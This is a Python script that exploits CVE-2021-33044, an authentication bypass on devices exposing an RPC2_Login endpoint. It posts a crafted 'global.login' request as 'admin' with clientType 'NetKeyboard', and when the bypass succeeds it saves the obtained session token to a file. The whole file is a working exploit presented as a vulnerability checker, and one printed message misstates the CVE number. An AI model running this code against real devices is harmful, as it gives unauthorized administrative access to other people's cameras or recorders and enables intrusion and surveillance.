import requests
import sys
from requests.packages import urllib3
import argparse
parser = argparse.ArgumentParser()
parser.add_argument("--ip", help="The target ip", required=True)
parser.add_argument("--port", help="The target port", default="80")
parser.add_argument("--protocol", help="http/https", default="http")

args = parser.parse_args()
if args.protocol != "http" and args.protocol != "https":
	print("Bad protocol!\nusage --protocol <http/https>")
	exit()
if args.ip and args.port:
	urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
	target = args.ip+":"+args.port
	url = args.protocol+"://"+target+"/RPC2_Login"
	print(url)
	headerss = {
	    "Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.81 Safari/537.36", "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8", "Origin": target+"/", "Referer": target+"/", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
	post_json={
	    "id": 1, "method": "global.login", "params": {"authorityType": "Default", "clientType": "NetKeyboard", "loginType": "Direct", "password": "Not Used", "passwordType": "Default", "userName": "admin"}, "session": 0
	    }
	r = requests.post(url, headers=headerss, json=post_json, verify=False)
	print (r.content)
	if 'true' in str(r.content):
		print ("vulnerable with CVE-2021-33044")
		with open('vulnerable.txt', 'w')as f:
			f.write(url)
			f.write('\n')
			f.write(str(r.content))
			f.close()
			print ("session token saved to vulnerable.txt")
	else:
		print ("Not Vulnerable with CVE-2021-3304!")
